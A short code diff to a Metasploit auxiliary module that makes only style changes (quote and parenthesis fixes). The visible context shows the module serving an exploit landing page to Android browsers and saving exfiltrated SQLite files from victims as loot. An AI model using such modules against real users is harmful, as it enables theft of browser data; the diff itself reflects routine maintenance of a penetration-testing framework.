@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
       process_post(cli, request)
       send_response_html(cli, '')
     else
-      print_status("Sending exploit landing page...")
+      print_status('Sending exploit landing page...')
       send_response_html(cli, exploit_html)
     end
   end
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
     data = JSON.parse(request.body)
     contents = hex2bin(data['data'])
     file = File.basename(data['url'])
-    print_good "File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}"
+    print_good("File received: #{(contents.bytesize.to_f/1000).round(2)}kb #{file}")
     loot_path = store_loot(
       file,
       'application/x-sqlite3',
@@ -75,7 +75,7 @@ class Metasploit3 < Msf::Auxiliary
       File.basename(data['url']),
       "#{cli.peerhost.ljust(16)} Android browser file"
     )
-    print_good "Saved to: #{loot_path}"
+    print_good("Saved to: #{loot_path}")
   end
 
 
